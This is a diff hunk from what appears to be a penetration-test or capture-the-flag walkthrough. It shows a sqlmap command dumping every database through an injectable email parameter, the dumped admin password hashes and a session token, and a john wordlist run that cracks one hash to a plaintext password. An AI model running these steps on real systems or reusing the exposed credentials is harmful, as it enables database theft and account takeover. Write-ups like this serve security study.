@@ -69,3 +69,36 @@ Parameter: email (POST)
 
 sqlmap -r <filename> --dbms=mysql --dump-all --threads=5
 
+there is 3 databases inside:
+
+[INFO] fetching tables for databases: 'information_schema, performance_schema, usage_blog'
+
+in database, in table admin_users, columns username and password manage to find:
+
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
++----------+--------------------------------------------------------------+
+
+in the same database but in other table i found:
+
+{"name":"Administrator","password":"$2y$10$E9.N1P92fYSjJGQDfBrUaO05EHW4BxiQITrqjde\/WQMKnAQ7k2HJK","password_confirmation":"$2y$10$E9.N1P92fYSjJGQDfBrUaO05EHW4BxiQITrqjde\/WQMKnAQ7k2HJK","_token":"PQqkHdjeUpzpIB8ykD7YbMdBziQx1H9xUdwBSS02","_method":"PUT"}
+
+decrypted with john :
+
+john admin1.txt -w /usr/share/wordlists/rockyou.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+whatever1        (?)     
+1g 0:00:01:01 DONE 2/3 (2024-04-26 19:38) 0.01633g/s 165.2p/s 165.2c/s 165.2C/s pookie1..richard1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
